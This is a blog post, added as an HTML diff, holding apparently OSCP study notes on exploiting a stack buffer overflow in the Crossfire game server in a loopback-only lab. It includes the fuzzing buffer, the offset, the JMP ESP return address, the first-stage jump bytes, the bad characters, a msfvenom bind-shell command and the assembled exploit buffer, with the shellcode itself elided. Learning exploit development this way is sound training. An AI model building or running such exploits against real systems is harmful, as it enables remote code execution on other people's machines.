@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        <meta charset="utf-8" />
+        <meta name="generator" content="Pelican" />
+        <title>"Linux Buffer Overflow"</title>
+        <link rel="stylesheet" href="/theme/css/main.css" />
+        <link href="/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Daniel Haggerty's Blog Atom Feed" />
+        <link href="/feeds/all.rss.xml" type="application/rss+xml" rel="alternate" title="Daniel Haggerty's Blog RSS Feed" />
+        <meta name="description" content="Linux Buffer Overflow (Crossfire) Download a version of the vulnerable app Crossfire Setup safe environment: iptables only allow traffic from..." />
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="/">Daniel Haggerty's Blog</a></h1>
+                <nav><ul>
+                    <li><a href="/category/dfir.html">DFIR</a></li>
+                    <li><a href="/category/docker.html">Docker</a></li>
+                    <li><a href="/category/network.html">Network+</a></li>
+                    <li class="active"><a href="/category/oscp.html">OSCP</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="/linux-buffer-overflow.html" rel="bookmark"
+           title="Permalink to "Linux Buffer Overflow"">"Linux Buffer Overflow"</a></h1>
+    </header>
+
+    <div class="entry-content">
+<footer class="post-info">
+        <abbr class="published" title="2019-10-31T00:00:00-05:00">
+                Published: Thu 31 October 2019
+        </abbr>
+
+        <address class="vcard author">
+                By                         <a class="url fn" href="/author/daniel-haggerty.html">Daniel Haggerty</a>
+        </address>
+<p>In <a href="/category/oscp.html">OSCP</a>.</p>
+<p>tags: <a href="/tag/penetration-testing.html">Penetration Testing</a> <a href="/tag/buffer-overflow.html">Buffer Overflow</a> </p>
+</footer><!-- /.post-info -->      <h1>Linux Buffer Overflow (Crossfire)</h1>
+<p>Download a version of the vulnerable app Crossfire</p>
+<h3>Setup safe environment: iptables only allow traffic from loopback interface=targetip</h3>
+<p>iptables –A, -p, -d, -j # Append, protocol, destination, jump
+crossfire listens on port 13327
+iptables -A INPUT -p tcp --destination-port 13327 ! -d 127.0.0.1 -j DROP
+iptables -A INPUT -p tcp --destination-port 4444 ! -d 127.0.0.1 -j DROP</p>
+<h3>1. Run debugger and crash the app</h3>
+<p>Get POC code from exploit db
+edb --run /usr/games/crossfire/bin/crossfire. In EDBG: Hit RUN twice
+crash = “\x41” <em>4379
+buffer = “\x11(setup sound “ + crash + “\x90\x00#”
+python fuzz.py
+2. Control EIP
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 4379
+Swap into the crash var: python linux_buffer_overflow.py 
+EIP has been overwritten with the hex characters… 46 36 70 46
+These are unique 4 bytes in the buffer. Now find where they are in the buffer.
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 4379 -q 46367046
+[</em>] Exact match at offset 4368
+Replace “crash = "\x41" * 4368 + "B" * 4 + "C" * 7”: python EIP_BBBB.py</p>
+<ol>
+<li>Make space for the shellcode<br>
+Check for helpful registers: Follow in dump.
+EAX points to buffer start “setup sound “ opstring (len 12). Want to avoid these bytes. 
+ESP points to end of buffer “C * 7” (spare bytes). 
+Add 12 bytes to EAX to align EAX with the A’s =&gt; JMP EAX we skip over “setup sound “
+/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+nasm &gt; add eax,12   83C00C add eax,byte +0xc
+nasm &gt; jmp eax      FFE0 jmp eax
+Add instructions together (JMP EAX + 12 bytes) = \x83\xc0\x0c\xff\xe0 to python. Looks like I didn’t test again here? Just note nasm output and move on?</li>
+<li>
+<p>Discover bad characters
+All bad chars (except x00) contained in deault named script. Can use this for future.
+python bad_chars.py
+ID/remove bad chars in buffer. Right-click EAX. Follow in stack &amp; dump. Stack looked better in EDBG. Scroll down dump until end of A’s. Then should see 01, 02, 03… etc until a failure. remove failure from bad_chars.py. Redo until ESP-error-free crash 
+Removed: (\x00\x0a\x0d\x20)</p>
+</li>
+<li>
+<p>Redirect execution flow - Find a return address
+So, we know we want to reach the buffer pointed to by the ESP register.
+EDBG: Plugins: Opcode Seacher: 
+Once the application is in a crashed state use dropdown to search for:
+ESP -&gt; EIP: 
+Choose 1st JMP ESP. Add address to python script at BBBB.
+crash = "\x41" * 4368 + "\x97\x45\x13\x08" + "\x83\xc0\x0c\xff\xe0\x90\x90“
+EDBG: Add breakpoint at 0x08134597 to execution flow. 
+Right-click Go to Address 0x08134597. Double click on it to place breakpoint.
+Restart EDBG. Send payload. Should pause at First stage payload.
+Next instruction is JMP ESP. F8. We are redirected to ESP 83C00C 
+As EAX register aligned by stage one, a JMP EAX takes us to a clean buffer of A’s</p>
+</li>
+<li>Make shellcode excluding bad characters
+bind or reverse? why?
+msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c –b "\x00\x0a\x0d\x20" –e x86/shikata_ga_nai
+Resulting shell code is 105 bytes</li>
+<li>Add shellcode into python script
+shellcode = ("\xd9... \x30")
+ret="\x97\x45\x13\x08”
+crash=shellcode + "\x41" * (4368 - 105) + ret + "\x83\xC0\x0C\xFF\xE0\x90\x90“
+buffer = "\x11(setup sound " + crash + "\x90\x00#“
+TURN OFF EDBG FOR EXPLOIT TO WORK: RUN CROSSFIRE: RUN EXPLOIT /usr/games/crossfire/bin/crossfire
+python exploit.py
+id; whoami</li>
+</ol>
+    </div><!-- /.entry-content -->
+
+  </article>
+</section>
+        <section id="extras" class="body">
+                <div class="blogroll">
+                        <h2>links</h2>
+                        <ul>
+                            <li><a href="https://getpelican.com/">Pelican</a></li>
+                            <li><a href="https://www.python.org/">Python.org</a></li>
+                            <li><a href="https://www.docker.com/">Docker</a></li>
+                        </ul>
+                </div><!-- /.blogroll -->
+                <div class="social">
+                        <h2>social</h2>
+                        <ul>
+                            <li><a href="/feeds/all.atom.xml" type="application/atom+xml" rel="alternate">atom feed</a></li>
+                            <li><a href="/feeds/all.rss.xml" type="application/rss+xml" rel="alternate">rss feed</a></li>
+
+                            <li><a href="#">Another social link</a></li>
+                        </ul>
+                </div><!-- /.social -->
+        </section><!-- /#extras -->
+
+        <footer id="contentinfo" class="body">
+                <address id="about" class="vcard body">
+                Proudly powered by <a href="https://getpelican.com/">Pelican</a>, which takes great advantage of <a href="https://www.python.org/">Python</a>.
+                </address><!-- /#about -->
+
+                <p>The theme is by <a href="https://www.smashingmagazine.com/2009/08/designing-a-html-5-layout-from-scratch/">Smashing Magazine</a>, thanks!</p>
+        </footer><!-- /#contentinfo -->
+
+</body>
+</html>
